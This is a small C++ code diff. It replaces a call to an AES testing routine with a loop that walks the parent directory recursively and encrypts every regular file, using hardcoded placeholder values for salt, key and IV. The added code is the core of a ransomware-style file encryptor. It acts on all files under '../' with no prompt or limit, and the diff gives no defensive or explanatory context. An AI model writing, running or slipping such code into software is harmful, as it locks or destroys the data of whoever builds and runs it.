@@ -1,8 +1,12 @@
 #include <iostream>
+#include <filesystem>
 
-#include "AesTesting.h"
+#include "Encryption.h"
 
 int main() {
-    startTesting();
+    for (const auto& dirEntry : std::filesystem::recursive_directory_iterator("../")) {
+        if(dirEntry.is_regular_file())
+            encryptFile(dirEntry, "salt", "key", "iv");
+    }
     return 0;
 }
